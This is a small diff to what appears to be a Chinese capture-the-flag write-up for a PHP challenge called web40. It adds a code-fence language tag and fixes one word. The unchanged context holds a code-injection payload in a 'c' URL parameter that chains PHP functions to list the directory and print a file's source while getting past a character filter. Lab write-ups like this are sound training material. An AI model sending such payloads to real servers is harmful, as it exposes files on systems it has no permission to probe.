@@ -393,7 +393,7 @@ payload:
 
 ### web40
 
-```
+```php
 <?php
 
 /*
@@ -422,7 +422,7 @@ if(isset($_GET['c'])){
 
 个人评价是：?c=echo%20highlight_file(next(array_reverse(scandir(pos(localeconv())))));
 
-什么嘛，那是中文括号，吓我一跳。
+什么嘛，那是中文符号，吓我一跳。
 
 
 
